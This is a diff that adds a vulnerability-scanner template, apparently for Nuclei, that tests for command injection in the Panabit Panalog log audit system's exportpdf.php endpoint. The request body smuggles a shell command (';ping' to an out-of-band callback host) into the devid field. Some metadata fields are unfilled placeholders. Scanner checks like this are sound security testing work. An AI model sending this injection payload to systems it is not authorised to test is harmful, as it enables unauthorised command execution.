@@ -1,0 +1,26 @@
+id: Panabit-Panalog-exportpdf-rce
+
+info:
+  name: Template Name
+  author: wangzong
+  severity: critical
+  description: Panabit Panalog大数据日志审计系统 命令执行漏洞
+  reference:
+    - https://
+  tags: tags
+
+http:
+  - raw:
+      - |-
+        POST /Maintain/exportpdf.php HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: PHPSESSID=4dkc7q5hu7lkdlsfm5a0tcirn6
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 27
+
+        devid=';ping {{interactsh-url}};
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
